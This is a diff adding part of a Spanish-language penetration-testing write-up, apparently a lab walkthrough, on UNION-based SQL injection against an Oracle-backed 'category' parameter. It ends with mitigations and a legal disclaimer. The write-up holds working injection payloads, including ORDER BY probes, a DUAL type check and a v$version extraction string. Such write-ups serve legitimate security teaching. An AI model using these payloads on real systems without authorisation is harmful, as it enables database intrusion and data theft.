@@ -20,3 +20,28 @@ Antes de realizar un ataque `UNION`, se debe identificar cuántas columnas devue
 ```sql
 ' ORDER BY 1--
 ' ORDER BY 2--
+```
+> Foto Burp Suite Repeater
+
+### Paso 2: Validación de tipos de datos compatibles
+Debido a las restricciones de Oracle, validamos si las columnas aceptan datos de tipo cadena (String) utilizando la tabla DUAL.
+```sql
+' UNION SELECT 'abc', 'def' FROM dual--
+```
+
+### Paso 3: Extracción de la versión de la base de datos (Payload Final)
+En Oracle, la versión se puede consultar en la tabla v$version. Formateamos el payload final:
+```sql
+' UNION SELECT banner, NULL FROM v$version--
+```
+
+## Mitigación
+1. Consultas Parametrizadas (Prepared Statements): Asegurar que las entradas del usuario nunca se concatenen directamente en la sentencia SQL.
+
+2. Validación de Entradas (White-listing): Implementar un filtrado estricto donde el parámetro category solo acepte valores previamente aprobados en una lista blanca.
+
+3. Principio de Menor Privilegio: Configurar la cuenta de conexión a la base de datos con permisos estrictamente limitados (por ejemplo, restringir el acceso de lectura a tablas del sistema como v$version si no es necesario para el negocio).
+
+## Aviso de Seguridad
+[!WARNING]
+Aviso de Seguridad: El contenido de este documento tiene fines exclusivamente educativos y de desarrollo profesional en pruebas de penetración autorizadas. La explotación de vulnerabilidades en entornos e infraestructura sin el consentimiento explícito y por escrito del propietario es ilegal y está penada por las leyes de ciberseguridad internacionales y locales. El autor no se hace responsable del mal uso de esta información.
